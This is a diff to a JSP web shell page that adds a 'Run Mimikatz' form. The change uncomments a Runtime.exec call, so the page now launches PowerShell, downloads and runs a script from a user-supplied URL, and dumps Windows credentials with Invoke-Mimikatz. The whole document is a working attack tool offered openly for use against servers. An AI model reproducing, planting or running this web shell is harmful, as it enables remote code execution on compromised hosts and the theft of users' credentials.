@@ -12,7 +12,7 @@ If you use this against a Windows box you may need to prefix your command with c
 <FORM METHOD="GET" NAME="myform2" ACTION="">
 <INPUT TYPE="text" name="mimilink"><br/>
 <INPUT TYPE="submit" name="auto" VALUE="Run Mimikatz"><br/>
-If you use this against a Windows box you may need to prefix your command with cmd.exe /c
+URL to the Invoke-Mimikatz powershell file
 </FORM>
 <pre>
 <%
@@ -163,7 +163,7 @@ if (request.getParameter("mimilink") != null) {
 	out.println("The command that will be executed is<br>");
 	String mimicmd = path + " -NonInteractive -Command \"IEX (New-Object Net.WebClient).DownloadString(\'" + request.getParameter("mimilink") + "\'); Invoke-Mimikatz -DumpCreds\"";
 	out.println(mimicmd+"<br>");
-	/*Process m = Runtime.getRuntime().exec(mimicmd);
+	Process m = Runtime.getRuntime().exec(mimicmd);
 	OutputStream mos = m.getOutputStream();
 	InputStream min = m.getInputStream();
 	DataInputStream mdis = new DataInputStream(min);
@@ -173,7 +173,7 @@ if (request.getParameter("mimilink") != null) {
 		mdisr = mdis.readLine();
 	}
 	m.getOutputStream().close();
-	m.getInputStream().close();*/
+	m.getInputStream().close();
 
 }
 %>
